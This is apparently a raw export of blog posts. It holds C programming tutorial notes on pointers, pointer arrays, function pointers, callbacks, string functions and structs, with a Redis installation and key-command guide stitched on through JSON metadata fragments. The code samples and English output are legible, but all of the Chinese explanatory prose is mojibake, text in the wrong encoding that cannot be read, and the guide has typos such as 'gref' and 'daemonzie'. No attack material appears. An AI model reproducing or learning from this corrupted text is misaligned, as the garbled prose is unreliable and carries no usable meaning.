æŒ‡é’ˆçš„æ¯”è¾ƒæŒ‡é’ˆå¯ä»¥ç”¨å…³ç³»è¿ç®—ç¬¦è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚ ==ã€&lt; å’Œ &gt;ã€‚å¦‚æœ p1 å’Œ p2 æŒ‡å‘ä¸¤ä¸ªç›¸å…³çš„å˜é‡ï¼Œæ¯”å¦‚åŒä¸€ä¸ªæ•°ç»„ä¸­çš„ä¸åŒå…ƒç´ ï¼Œåˆ™å¯å¯¹ p1 å’Œ p2 è¿›è¡Œå¤§å°æ¯”è¾ƒã€‚ ä¸‹é¢çš„ç¨‹åºä¿®æ”¹äº†ä¸Šé¢çš„å®ä¾‹ï¼Œåªè¦å˜é‡æŒ‡é’ˆæ‰€æŒ‡å‘çš„åœ°å€å°äºæˆ–ç­‰äºæ•°ç»„çš„æœ€åä¸€ä¸ªå…ƒç´ çš„åœ°å€ &amp;var[MAX - 1]ï¼Œåˆ™æŠŠå˜é‡æŒ‡é’ˆè¿›è¡Œé€’å¢ï¼š #include &lt;stdio.h&gt; const int MAX = 3; int main () { int var[] = {10, 100, 200}; int i, *ptr; /* æŒ‡é’ˆä¸­ç¬¬ä¸€ä¸ªå…ƒç´ çš„åœ°å€ */ ptr = var; i = 0; while ( ptr &lt;= &amp;var[MAX - 1] ) { printf(&quot;Address of var[%d] = %p\\n&quot;, i, ptr ); printf(&quot;Value of var[%d] = %d\\n&quot;, i, *ptr ); /* æŒ‡å‘ä¸Šä¸€ä¸ªä½ç½® */ ptr++; i++; } return 0; } ---------------- Address of var[0] = bfdbcb20 Value of var[0] = 10 Address of var[1] = bfdbcb24 Value of var[1] = 100 Address of var[2] = bfdbcb28 Value of var[2] = 200 æŒ‡é’ˆæ•°ç»„ä¸€ä¸ªæŒ‡å‘æ•´æ•°çš„æŒ‡é’ˆæ•°ç»„çš„å£°æ˜ï¼š int *ptr[MAX]; åœ¨è¿™é‡Œï¼ŒæŠŠ ptr å£°æ˜ä¸ºä¸€ä¸ªæ•°ç»„ï¼Œç”± MAX ä¸ªæ•´æ•°æŒ‡é’ˆç»„æˆã€‚å› æ­¤ï¼Œptr ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼Œéƒ½æ˜¯ä¸€ä¸ªæŒ‡å‘ int å€¼çš„æŒ‡é’ˆã€‚ä¸‹é¢çš„å®ä¾‹ç”¨åˆ°äº†ä¸‰ä¸ªæ•´æ•°ï¼Œå®ƒä»¬å°†å­˜å‚¨åœ¨ä¸€ä¸ªæŒ‡é’ˆæ•°ç»„ä¸­ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š #include &lt;stdio.h&gt; const int MAX = 3; int main () { int var[] = {10, 100, 200}; int i, *ptr[MAX]; for ( i = 0; i &lt; MAX; i++) { ptr[i] = &amp;var[i]; /* èµ‹å€¼ä¸ºæ•´æ•°çš„åœ°å€ */ } for ( i = 0; i &lt; MAX; i++) { printf(&quot;Value of var[%d] = %d\\n&quot;, i, *ptr[i] ); } return 0; } ------ Value of var[0] = 10 Value of var[1] = 100 Value of var[2] = 200 æ‚¨ä¹Ÿå¯ä»¥ç”¨ä¸€ä¸ªæŒ‡å‘å­—ç¬¦çš„æŒ‡é’ˆæ•°ç»„æ¥å­˜å‚¨ä¸€ä¸ªå­—ç¬¦ä¸²åˆ—è¡¨ï¼Œå¦‚ä¸‹ï¼š #include &lt;stdio.h&gt; const int MAX = 4; int main () { const char *names[] = { &quot;Zara Ali&quot;, &quot;Hina Ali&quot;, &quot;Nuha Ali&quot;, &quot;Sara Ali&quot;, }; int i = 0; for ( i = 0; i &lt; MAX; i++) { printf(&quot;Value of names[%d] = %s\\n&quot;, i, names[i] ); } return 0; } ------ Value of names[0] = Zara Ali Value of names[1] = Hina Ali Value of names[2] = Nuha Ali Value of names[3] = Sara Ali æŒ‡å‘æŒ‡é’ˆçš„æŒ‡é’ˆ æŒ‡å‘æŒ‡é’ˆçš„æŒ‡é’ˆæ˜¯ä¸€ç§å¤šçº§é—´æ¥å¯»å€çš„å½¢å¼ï¼Œæˆ–è€…è¯´æ˜¯ä¸€ä¸ªæŒ‡é’ˆé“¾ã€‚é€šå¸¸ï¼Œä¸€ä¸ªæŒ‡é’ˆåŒ…å«ä¸€ä¸ªå˜é‡çš„åœ°å€ã€‚å½“æˆ‘ä»¬å®šä¹‰ä¸€ä¸ªæŒ‡å‘æŒ‡é’ˆçš„æŒ‡é’ˆæ—¶ï¼Œç¬¬ä¸€ä¸ªæŒ‡é’ˆåŒ…å«äº†ç¬¬äºŒä¸ªæŒ‡é’ˆçš„åœ°å€ï¼Œç¬¬äºŒä¸ªæŒ‡é’ˆæŒ‡å‘åŒ…å«å®é™…å€¼çš„ä½ç½®ã€‚ Pointer Pointer Variable _____________ _____________ _____________ | Address | ------&gt;| Address |--------&gt;| Value | |_____________| |_____________| |_____________| ä¸€ä¸ªæŒ‡å‘æŒ‡é’ˆçš„æŒ‡é’ˆå˜é‡å¿…é¡»å¦‚ä¸‹å£°æ˜ï¼Œå³åœ¨å˜é‡åå‰æ”¾ç½®ä¸¤ä¸ªæ˜Ÿå·ã€‚ä¾‹å¦‚ï¼Œä¸‹é¢å£°æ˜äº†ä¸€ä¸ªæŒ‡å‘ int ç±»å‹æŒ‡é’ˆçš„æŒ‡é’ˆï¼š int **var; å½“ä¸€ä¸ªç›®æ ‡å€¼è¢«ä¸€ä¸ªæŒ‡é’ˆé—´æ¥æŒ‡å‘åˆ°å¦ä¸€ä¸ªæŒ‡é’ˆæ—¶ï¼Œè®¿é—®è¿™ä¸ªå€¼éœ€è¦ä½¿ç”¨ä¸¤ä¸ªæ˜Ÿå·è¿ç®—ç¬¦ï¼Œå¦‚ä¸‹é¢å®ä¾‹æ‰€ç¤ºï¼š #include &lt;stdio.h&gt; int main () { int var; int *ptr; int **pptr; var = 3000; /* è·å– var çš„åœ°å€ */ ptr = &amp;var; /* ä½¿ç”¨è¿ç®—ç¬¦ &amp; è·å– ptr çš„åœ°å€ */ pptr = &amp;ptr; /* ä½¿ç”¨ pptr è·å–å€¼ */ printf(&quot;Value of var = %d\\n&quot;, var ); printf(&quot;Value available at *ptr = %d\\n&quot;, *ptr ); printf(&quot;Value available at **pptr = %d\\n&quot;, **pptr); return 0; } ------------------- Value of var = 3000 Value available at *ptr = 3000 Value available at **pptr = 3000 æŒ‡é’ˆæ•°ç»„å’Œæ•°ç»„æŒ‡é’ˆint *p1[5] ----------æŒ‡é’ˆæ•°ç»„ int (*p2)[5]---------æ•°ç»„æŒ‡é’ˆ æŒ‡é’ˆæ•°ç»„æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œæ¯ä¸ªæ•°ç»„å…ƒç´ å­˜æ”¾ä¸€ä¸ªæŒ‡é’ˆå˜é‡ã€‚ #include &lt;stdio.h&gt; int main() { //æŒ‡é’ˆæ•°ç»„ï¼Œé‡Œé¢å­˜çš„æ˜¯æŒ‡é’ˆ char *p1[5] = {&quot;wo&quot;, &quot;jiao&quot;, &quot;Kayleh&quot;, &quot;!&quot;}; int i; for (i = 0; i &lt; 5; i++) { /* code */ // %sä¼šå–åœ°å€å¯¹åº”çš„å€¼ï¼Œcharå½¢æ˜¯ç‰¹åˆ—,é€šè¿‡å­—ç¬¦ä¸²é¦–åœ°å€è¾“å‡ºå­—ç¬¦ä¸² printf(&quot;%s\\n&quot;, p1[i]); } } æ•°ç»„æŒ‡é’ˆæ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼Œå®ƒæŒ‡å‘çš„æ˜¯ä¸€ä¸ªæ•°ç»„ #include &lt;stdio.h&gt; int main() { int temp[5] = {1, 2, 3, 4, 5}; //&amp;tempè¡¨ç¤ºå–å‡ºæ•´ä¸ªæ•°ç»„çš„åœ°å€ //tempè¡¨ç¤ºæ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ çš„åœ°å€ int(*p2)[5] = &amp;temp; int i; for (i = 0; i &lt; 5; i++) { /* code */ //å†…éƒ¨çš„*å–å¾—æ˜¯æ•°ç»„çš„ï¼Œå¤–éƒ¨çš„å–å¾—æ˜¯æ•°ç»„å…ƒç´ çš„ printf(&quot;%d\\n&quot;, *(*p2 + i)); } return 0; } äºŒç»´æ•°ç»„æ•°ç»„åå®é™…ä¸Šæ˜¯ç¬¬ä¸€ç»„ä¸€ç»´æ•°ç»„çš„æŒ‡é’ˆã€‚ array[4][5] *(array+1) = array[1] = &amp;array[1][0] *(array+1)+3 == &amp;array[1][3] ç»“è®º *(array+i) == array[i] *(*(array+i)+j) == &amp;array[i][j] *(*(*(array+i)+j)+k) == &amp;array[i][j][k] åˆå§‹åŒ–äºŒç»´æ•°ç»„ int array[][3];//å‰é¢çš„å¯ä¸å†™ æ•°ç»„æŒ‡é’ˆå’ŒäºŒç»´æ•°ç»„ voidæŒ‡é’ˆ voidæŒ‡é’ˆç§°ä¸ºé€šç”¨æŒ‡é’ˆï¼Œå°±æ˜¯å¯ä»¥æŒ‡å‘ä»»æ„ç±»å‹çš„æ•°æ®ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä»»ä½•ç±»å‹çš„æŒ‡é’ˆéƒ½å¯ä»¥èµ‹å€¼ç»™voidæŒ‡é’ˆ #include &lt;stdio.h&gt; int main() { int num = 1024; int *pi = &amp;num; char *pc = &quot;Kayleh&quot;; void *pv; pv = pi; printf(&quot;pi:%p,pv:%p\\n&quot;, pi, pv); printf(&quot;pv:%d\\n&quot;, *(int *)pv); //å¼ºåˆ¶è½¬æ¢ pv = pc; printf(&quot;pc:%p,pv:%p\\n&quot;, pc, pv); //å› ä¸ºå­—ç¬¦æ•°ç»„ä¸­æ¯ä¸€ä¸ªå…ƒç´ éƒ½ç›¸å½“äºä¸€ä¸ªæŒ‡é’ˆå˜é‡ï¼Œå°±ä¸éœ€è¦åœ¨åŠ *äº†ï¼Œä¸ç”¨è§£å¼•ç”¨ printf(&quot;pv:%s\\n&quot;, pv); return 0; } NULLæŒ‡é’ˆ#define NULL ((void *)0) #include &lt;stdio.h&gt; int main() { int *p1; int *p2 = NULL; printf(&quot;%d\\n&quot;, *p1); printf(&quot;%d\\n&quot;, *p2); return 0; } å‡½æ•°å®šä¹‰ return_type function_name( parameter list ) { body of the function } è¿”å›ç±»å‹ï¼šä¸€ä¸ªå‡½æ•°å¯ä»¥è¿”å›ä¸€ä¸ªå€¼ã€‚return_type æ˜¯å‡½æ•°è¿”å›çš„å€¼çš„æ•°æ®ç±»å‹ã€‚æœ‰äº›å‡½æ•°æ‰§è¡Œæ‰€éœ€çš„æ“ä½œè€Œä¸è¿”å›å€¼ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œreturn_type æ˜¯å…³é”®å­— voidã€‚ å‡½æ•°åç§°ï¼šè¿™æ˜¯å‡½æ•°çš„å®é™…åç§°ã€‚å‡½æ•°åå’Œå‚æ•°åˆ—è¡¨ä¸€èµ·æ„æˆäº†å‡½æ•°ç­¾åã€‚ å‚æ•°ï¼šå‚æ•°å°±åƒæ˜¯å ä½ç¬¦ã€‚å½“å‡½æ•°è¢«è°ƒç”¨æ—¶ï¼Œæ‚¨å‘å‚æ•°ä¼ é€’ä¸€ä¸ªå€¼ï¼Œè¿™ä¸ªå€¼è¢«ç§°ä¸ºå®é™…å‚æ•°ã€‚å‚æ•°åˆ—è¡¨åŒ…æ‹¬å‡½æ•°å‚æ•°çš„ç±»å‹ã€é¡ºåºã€æ•°é‡ã€‚å‚æ•°æ˜¯å¯é€‰çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå‡½æ•°å¯èƒ½ä¸åŒ…å«å‚æ•°ã€‚ å‡½æ•°ä¸»ä½“ï¼šå‡½æ•°ä¸»ä½“åŒ…å«ä¸€ç»„å®šä¹‰å‡½æ•°æ‰§è¡Œä»»åŠ¡çš„è¯­å¥ã€‚ å‡½æ•°æŒ‡é’ˆå‡½æ•°æŒ‡é’ˆæ˜¯æŒ‡å‘å‡½æ•°çš„æŒ‡é’ˆå˜é‡ã€‚ é€šå¸¸æˆ‘ä»¬è¯´çš„æŒ‡é’ˆå˜é‡æ˜¯æŒ‡å‘ä¸€ä¸ªæ•´å‹ã€å­—ç¬¦å‹æˆ–æ•°ç»„ç­‰å˜é‡ï¼Œè€Œå‡½æ•°æŒ‡é’ˆæ˜¯æŒ‡å‘å‡½æ•°ã€‚ å‡½æ•°æŒ‡é’ˆå¯ä»¥åƒä¸€èˆ¬å‡½æ•°ä¸€æ ·ï¼Œç”¨äºè°ƒç”¨å‡½æ•°ã€ä¼ é€’å‚æ•°ã€‚ å‡½æ•°æŒ‡é’ˆå˜é‡çš„å£°æ˜ï¼š typedef int (*fun_ptr)(int,int); // å£°æ˜ä¸€ä¸ªæŒ‡å‘åŒæ ·å‚æ•°ã€è¿”å›å€¼çš„å‡½æ•°æŒ‡é’ˆç±»å‹ #include &lt;stdio.h&gt; int max(int x, int y) { return x &gt; y ? x : y; } int main(void) { /* p æ˜¯å‡½æ•°æŒ‡é’ˆ */ int (* p)(int, int) = &amp; max; // &amp;å¯ä»¥çœç•¥ int a, b, c, d; printf(&quot;è¯·è¾“å…¥ä¸‰ä¸ªæ•°å­—:&quot;); scanf(&quot;%d %d %d&quot;, &amp; a, &amp; b, &amp; c); /* ä¸ç›´æ¥è°ƒç”¨å‡½æ•°ç­‰ä»·ï¼Œd = max(max(a, b), c) */ d = p(p(a, b), c); printf(&quot;æœ€å¤§çš„æ•°å­—æ˜¯: %d\\n&quot;, d); return 0; } ------------------ è¯·è¾“å…¥ä¸‰ä¸ªæ•°å­—:1 2 3 æœ€å¤§çš„æ•°å­—æ˜¯: 3 å›è°ƒå‡½æ•°å‡½æ•°æŒ‡é’ˆä½œä¸ºæŸä¸ªå‡½æ•°çš„å‚æ•°å‡½æ•°æŒ‡é’ˆå˜é‡å¯ä»¥ä½œä¸ºæŸä¸ªå‡½æ•°çš„å‚æ•°æ¥ä½¿ç”¨çš„ï¼Œå›è°ƒå‡½æ•°å°±æ˜¯ä¸€ä¸ªé€šè¿‡å‡½æ•°æŒ‡é’ˆè°ƒç”¨çš„å‡½æ•°ã€‚ ç®€å•è®²ï¼šå›è°ƒå‡½æ•°æ˜¯ç”±åˆ«äººçš„å‡½æ•°æ‰§è¡Œæ—¶è°ƒç”¨ä½ å®ç°çš„å‡½æ•°ã€‚ ä»¥ä¸‹æ˜¯æ¥è‡ªçŸ¥ä¹ä½œè€…å¸¸æºªç²çš„è§£è¯´ï¼š ä½ åˆ°ä¸€ä¸ªå•†åº—ä¹°ä¸œè¥¿ï¼Œåˆšå¥½ä½ è¦çš„ä¸œè¥¿æ²¡æœ‰è´§ï¼Œäºæ˜¯ä½ åœ¨åº—å‘˜é‚£é‡Œç•™ä¸‹äº†ä½ çš„ç”µè¯ï¼Œè¿‡äº†å‡ å¤©åº—é‡Œæœ‰è´§äº†ï¼Œåº—å‘˜å°±æ‰“äº†ä½ çš„ç”µè¯ï¼Œç„¶åä½ æ¥åˆ°ç”µè¯åå°±åˆ°åº—é‡Œå»å–äº†è´§ã€‚åœ¨è¿™ä¸ªä¾‹å­é‡Œï¼Œä½ çš„ç”µè¯å·ç å°±å«å›è°ƒå‡½æ•°ï¼Œä½ æŠŠç”µè¯ç•™ç»™åº—å‘˜å°±å«ç™»è®°å›è°ƒå‡½æ•°ï¼Œåº—é‡Œåæ¥æœ‰è´§äº†å«åšè§¦å‘äº†å›è°ƒå…³è”çš„äº‹ä»¶ï¼Œåº—å‘˜ç»™ä½ æ‰“ç”µè¯å«åšè°ƒç”¨å›è°ƒå‡½æ•°ï¼Œä½ åˆ°åº—é‡Œå»å–è´§å«åšå“åº”å›è°ƒäº‹ä»¶ã€‚ å®ä¾‹å®ä¾‹ä¸­ populate_array å‡½æ•°å®šä¹‰äº†ä¸‰ä¸ªå‚æ•°ï¼Œå…¶ä¸­ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯å‡½æ•°çš„æŒ‡é’ˆï¼Œé€šè¿‡è¯¥å‡½æ•°æ¥è®¾ç½®æ•°ç»„çš„å€¼ã€‚ å®ä¾‹ä¸­æˆ‘ä»¬å®šä¹‰äº†å›è°ƒå‡½æ•° getNextRandomValueï¼Œå®ƒè¿”å›ä¸€ä¸ªéšæœºå€¼ï¼Œå®ƒä½œä¸ºä¸€ä¸ªå‡½æ•°æŒ‡é’ˆä¼ é€’ç»™ populate_array å‡½æ•°ã€‚ populate_array å°†è°ƒç”¨ 10 æ¬¡å›è°ƒå‡½æ•°ï¼Œå¹¶å°†å›è°ƒå‡½æ•°çš„è¿”å›å€¼èµ‹å€¼ç»™æ•°ç»„ã€‚ #include &lt;stdlib.h&gt; #include &lt;stdio.h&gt; // å›è°ƒå‡½æ•° void populate_array(int *array, size_t arraySize, int (*getNextValue)(void)) { for (size_t i=0; i&lt;arraySize; i++) array[i] = getNextValue(); } // è·å–éšæœºå€¼ int getNextRandomValue(void) { return rand(); } int main(void) { int myarray[10]; populate_array(myarray, 10, getNextRandomValue); for(int i = 0; i &lt; 10; i++) { printf(&quot;%d &quot;, myarray[i]); } printf(&quot;\\n&quot;); return 0; } -------------------- 16807 282475249 1622650073 984943658 1144108930 470211272 101027544 1457850878 1458777923 2007237709 C ä¼ é€’æŒ‡é’ˆç»™å‡½æ•°C è¯­è¨€å…è®¸æ‚¨ä¼ é€’æŒ‡é’ˆç»™å‡½æ•°ï¼Œåªéœ€è¦ç®€å•åœ°å£°æ˜å‡½æ•°å‚æ•°ä¸ºæŒ‡é’ˆç±»å‹å³å¯ã€‚ ä¸‹é¢çš„å®ä¾‹ä¸­ï¼Œæˆ‘ä»¬ä¼ é€’ä¸€ä¸ªæ— ç¬¦å·çš„ long å‹æŒ‡é’ˆç»™å‡½æ•°ï¼Œå¹¶åœ¨å‡½æ•°å†…æ”¹å˜è¿™ä¸ªå€¼ï¼š #include &lt;stdio.h&gt; #include &lt;time.h&gt; void getSeconds(unsigned long *par); int main () { unsigned long sec; getSeconds( &amp;sec ); /* è¾“å‡ºå®é™…å€¼ */ printf(&quot;Number of seconds: %ld\\n&quot;, sec ); return 0; } void getSeconds(unsigned long *par) { /* è·å–å½“å‰çš„ç§’æ•° */ *par = time( NULL ); return; } ------------------ Number of seconds :1294450468 èƒ½æ¥å—æŒ‡é’ˆä½œä¸ºå‚æ•°çš„å‡½æ•°ï¼Œä¹Ÿèƒ½æ¥å—æ•°ç»„ä½œä¸ºå‚æ•°ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š #include &lt;stdio.h&gt; /* å‡½æ•°å£°æ˜ */ double getAverage(int *arr, int size); int main () { /* å¸¦æœ‰ 5 ä¸ªå…ƒç´ çš„æ•´å‹æ•°ç»„ */ int balance[5] = {1000, 2, 3, 17, 50}; double avg; /* ä¼ é€’ä¸€ä¸ªæŒ‡å‘æ•°ç»„çš„æŒ‡é’ˆä½œä¸ºå‚æ•° */ avg = getAverage( balance, 5 ) ; /* è¾“å‡ºè¿”å›å€¼ */ printf(&quot;Average value is: %f\\n&quot;, avg ); return 0; } double getAverage(int *arr, int size) { int i, sum = 0; double avg; for (i = 0; i &lt; size; ++i) { sum += arr[i]; } avg = (double)sum / size; return avg; } ------------------ Average value is: 214.40000 C ä»å‡½æ•°è¿”å›æŒ‡é’ˆ C å…è®¸æ‚¨ä»å‡½æ•°è¿”å›æŒ‡é’ˆã€‚ä¸ºäº†åšåˆ°è¿™ç‚¹ï¼Œæ‚¨å¿…é¡»å£°æ˜ä¸€ä¸ªè¿”å›æŒ‡é’ˆçš„å‡½æ•°ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š int * myFunction() { . . . } C è¯­è¨€ä¸æ”¯æŒåœ¨è°ƒç”¨å‡½æ•°æ—¶è¿”å›å±€éƒ¨å˜é‡çš„åœ°å€ï¼Œé™¤éå®šä¹‰å±€éƒ¨å˜é‡ä¸º static å˜é‡ã€‚ ç°åœ¨ï¼Œè®©æˆ‘ä»¬æ¥çœ‹ä¸‹é¢çš„å‡½æ•°ï¼Œå®ƒä¼šç”Ÿæˆ 10 ä¸ªéšæœºæ•°ï¼Œå¹¶ä½¿ç”¨è¡¨ç¤ºæŒ‡é’ˆçš„æ•°ç»„åï¼ˆå³ç¬¬ä¸€ä¸ªæ•°ç»„å…ƒç´ çš„åœ°å€ï¼‰æ¥è¿”å›å®ƒä»¬ï¼Œå…·ä½“å¦‚ä¸‹ï¼š #include &lt;stdio.h&gt; #include &lt;time.h&gt; #include &lt;stdlib.h&gt; /* è¦ç”Ÿæˆå’Œè¿”å›éšæœºæ•°çš„å‡½æ•° */ int * getRandom( ) { static int r[10]; int i; /* è®¾ç½®ç§å­ */ srand( (unsigned)time( NULL ) ); for ( i = 0; i &lt; 10; ++i) { r[i] = rand(); printf(&quot;%d\\n&quot;, r[i] ); } return r; } /* è¦è°ƒç”¨ä¸Šé¢å®šä¹‰å‡½æ•°çš„ä¸»å‡½æ•° */ int main () { /* ä¸€ä¸ªæŒ‡å‘æ•´æ•°çš„æŒ‡é’ˆ */ int *p; int i; p = getRandom(); for ( i = 0; i &lt; 10; i++ ) { printf(&quot;*(p + [%d]) : %d\\n&quot;, i, *(p + i) ); } return 0; } ----------------------- 1523198053 1187214107 1108300978 430494959 1421301276 930971084 123250484 106932140 1604461820 149169022 *(p + [0]) : 1523198053 *(p + [1]) : 1187214107 *(p + [2]) : 1108300978 *(p + [3]) : 430494959 *(p + [4]) : 1421301276 *(p + [5]) : 930971084 *(p + [6]) : 123250484 *(p + [7]) : 106932140 *(p + [8]) : 1604461820 *(p + [9]) : 149169022 å­—ç¬¦ä¸² C ä¸­æœ‰å¤§é‡æ“ä½œå­—ç¬¦ä¸²çš„å‡½æ•°ï¼š å‡½æ•° ç›®çš„ strcpy(s1, s2); å¤åˆ¶å­—ç¬¦ä¸² s2 åˆ°å­—ç¬¦ä¸² s1ã€‚ strcat(s1, s2); è¿æ¥å­—ç¬¦ä¸² s2 åˆ°å­—ç¬¦ä¸² s1 çš„æœ«å°¾ã€‚ strlen(s1); è¿”å›å­—ç¬¦ä¸² s1 çš„é•¿åº¦ã€‚ strcmp(s1, s2); å¦‚æœ s1 å’Œ s2 æ˜¯ç›¸åŒçš„ï¼Œåˆ™è¿”å› 0ï¼›å¦‚æœ s1s2 åˆ™è¿”å›å¤§äº 0ã€‚ strchr(s1, ch); è¿”å›ä¸€ä¸ªæŒ‡é’ˆï¼ŒæŒ‡å‘å­—ç¬¦ä¸² s1 ä¸­å­—ç¬¦ ch çš„ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ã€‚ strstr(s1, s2); è¿”å›ä¸€ä¸ªæŒ‡é’ˆï¼ŒæŒ‡å‘å­—ç¬¦ä¸² s1 ä¸­å­—ç¬¦ä¸² s2 çš„ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ã€‚ C ç»“æ„ä½“C æ•°ç»„å…è®¸å®šä¹‰å¯å­˜å‚¨ç›¸åŒç±»å‹æ•°æ®é¡¹çš„å˜é‡ï¼Œç»“æ„æ˜¯ C ç¼–ç¨‹ä¸­å¦ä¸€ç§ç”¨æˆ·è‡ªå®šä¹‰çš„å¯ç”¨çš„æ•°æ®ç±»å‹ï¼Œå®ƒå…è®¸æ‚¨å­˜å‚¨ä¸åŒç±»å‹çš„æ•°æ®é¡¹ã€‚ ç»“æ„ç”¨äºè¡¨ç¤ºä¸€æ¡è®°å½•ï¼Œå‡è®¾æ‚¨æƒ³è¦è·Ÿè¸ªå›¾ä¹¦é¦†ä¸­ä¹¦æœ¬çš„åŠ¨æ€ï¼Œæ‚¨å¯èƒ½éœ€è¦è·Ÿè¸ªæ¯æœ¬ä¹¦çš„ä¸‹åˆ—å±æ€§ï¼š Title Author Subject Book ID å®šä¹‰ç»“æ„ä¸ºäº†å®šä¹‰ç»“æ„ï¼Œæ‚¨å¿…é¡»ä½¿ç”¨ struct è¯­å¥ã€‚struct è¯­å¥å®šä¹‰äº†ä¸€ä¸ªåŒ…å«å¤šä¸ªæˆå‘˜çš„æ–°çš„æ•°æ®ç±»å‹ï¼Œstruct è¯­å¥çš„æ ¼å¼å¦‚ä¸‹ï¼š struct tag { member-list member-list member-list ... } variable-list ; tag æ˜¯ç»“æ„ä½“æ ‡ç­¾ã€‚ member-list æ˜¯æ ‡å‡†çš„å˜é‡å®šä¹‰ï¼Œæ¯”å¦‚ int i; æˆ–è€… float fï¼Œæˆ–è€…å…¶ä»–æœ‰æ•ˆçš„å˜é‡å®šä¹‰ã€‚ variable-list ç»“æ„å˜é‡ï¼Œå®šä¹‰åœ¨ç»“æ„çš„æœ«å°¾ï¼Œæœ€åä¸€ä¸ªåˆ†å·ä¹‹å‰ï¼Œæ‚¨å¯ä»¥æŒ‡å®šä¸€ä¸ªæˆ–å¤šä¸ªç»“æ„å˜é‡ã€‚ä¸‹é¢æ˜¯å£°æ˜ Book ç»“æ„çš„æ–¹å¼ï¼š struct Books { char title[50]; char author[50]; char subject[100]; int book_id; } book åœ¨ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œtagã€member-listã€variable-list è¿™ 3 éƒ¨åˆ†è‡³å°‘è¦å‡ºç° 2 ä¸ªã€‚ ç»“æ„ä½“çš„æˆå‘˜å¯ä»¥åŒ…å«å…¶ä»–ç»“æ„ä½“ï¼Œä¹Ÿå¯ä»¥åŒ…å«æŒ‡å‘è‡ªå·±ç»“æ„ä½“ç±»å‹çš„æŒ‡é’ˆï¼Œè€Œé€šå¸¸è¿™ç§æŒ‡é’ˆçš„åº”ç”¨æ˜¯ä¸ºäº†å®ç°ä¸€äº›æ›´é«˜çº§çš„æ•°æ®ç»“æ„å¦‚é“¾è¡¨å’Œæ ‘ç­‰ã€‚ //æ­¤ç»“æ„ä½“çš„å£°æ˜åŒ…å«äº†å…¶ä»–çš„ç»“æ„ä½“ struct COMPLEX { char string[100]; struct SIMPLE a; }; //æ­¤ç»“æ„ä½“çš„å£°æ˜åŒ…å«äº†æŒ‡å‘è‡ªå·±ç±»å‹çš„æŒ‡é’ˆ struct NODE { char string[100]; struct NODE *next_node; };","categories":[],"tags":[{"name":"C","slug":"C","permalink":"https://blog.kayleh.top/tags/C/"}]},{"title":"Redis","slug":"Redis","date":"2020-06-27T01:30:29.000Z","updated":"2021-04-15T15:12:07.281Z","comments":true,"path":"Redis/","link":"","permalink":"https://blog.kayleh.top/Redis/","excerpt":"Redis","text":"Redis åœ¨Linuxä¸‹å®‰è£… https://redis.io/ å®˜ç½‘ä¸‹è½½ï¼Œç§»åŠ¨åˆ°/opt ç›®å½•ä¸‹. åœ¨ç»ˆç«¯ä½¿ç”¨å‘½ä»¤è§£å‹ $ tar -zxvf redis-XXXXXX.tar.gz è¿›å…¥è§£å‹åçš„ç›®å½•,è¿è¡ŒmakeæŒ‡ä»¤(éœ€è¦GCCç¼–è¯‘å™¨) $ cd redis.XXX $ make $ make install è¿›å…¥é»˜è®¤å®‰è£…çš„ç›®å½• $ cd usr/local/bin åœ¨æ ¹ç›®å½•åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¤¹/myredisï¼ŒæŠŠå®‰è£…ç›®å½•ä¸‹çš„redis.confå¤åˆ¶åˆ°/myredisï¼Œå¤åˆ¶çš„ç›®çš„æ˜¯ä¸å½±å“å‡ºå‚çš„è®¾ç½® cp redis.conf /myredis è¦æŠŠmyredisçš„æƒé™ä¿®æ”¹,å¦åˆ™ä¼šå‡ºç°redisæ— æ³•SHUTDOWNçš„é—®é¢˜ sudo chmod 777 /myredis ä¿®æ”¹å¤åˆ¶è¿‡æ¥çš„conf vim redis.conf ä¿®æ”¹ä¸ºä¸ºyes åŸæ¥çš„ï¼š ##########GENERAL################### XXX daemonzie no ä¿®æ”¹ä¸º: daemonize yes æ£€æŸ¥æœ‰æ²¡æœ‰å¯åŠ¨Redis $ ps -ef|gref redis æ£€æŸ¥ç«¯å£æ˜¯å¦å¯åŠ¨ lsof -i :6379 ç»“æœæ˜¯æ²¡æœ‰å¯åŠ¨çš„ å¯åŠ¨æ–¹æ³•ï¼šåœ¨/usr/local/binä¸‹ï¼š $ redis-server /myredis/redis.conf é»˜è®¤ç«¯å£æ˜¯6379 $ redis-cli -p 6379 æ£€æŸ¥æ˜¯å¦è¿æ¥æˆåŠŸ 127.0.0.1:6379&gt; ping PONG è¿”å›PONGè¡¨ç¤ºæˆåŠŸ é€€å‡ºï¼š 127.0.0.1:6379&gt; SHUTDOWN exit KEYå…³é”®å­—DBSIZE //å½“å‰æ•°æ®åº“çš„keyçš„æ•°é‡ select db //åˆ‡æ¢æ•°æ®åº“ Flushdb //æ¸…ç©ºå½“å‰åº“ Flushall //æ¸…ç©ºæ‰€æœ‰åº“ key * å½“å‰åº“æ‰€æœ‰çš„key exists key //åˆ¤æ–­keyæ˜¯å¦å­˜åœ¨ï¼Œæœ‰è¿”å›1ï¼Œæ— åˆ™0 move key db //ç§»åŠ¨åˆ°ç›®æ ‡åº“ï¼Œå½“å‰åº“çš„ç§»é™¤ expire key ç§’é’Ÿ //ç»™keyè®¾ç½®è¿‡æœŸæ—¶é—´ï¼Œè¿‡æœŸåæŸ¥è¯¢åˆ°çš„æ˜¯nidç©ºå€¼ ttl key //æŸ¥çœ‹è¿˜æœ‰å¤šä¹…è¿‡æœŸï¼Œ-1è¡¨ç¤ºæ°¸ä¸è¿‡æœŸï¼Œ-2è¡¨ç¤ºå·²è¿‡æœŸ type key //æŸ¥çœ‹keyæ˜¯ä»€ä¹ˆç±»å‹ redisäº”ç§æ•°æ®ç»“æ„Stringï¼šå­—ç¬¦ä¸²set key value get key del key append key value //åœ¨valueåè¿½åŠ  strlen //Stringé•¿åº¦ INCR/DECR 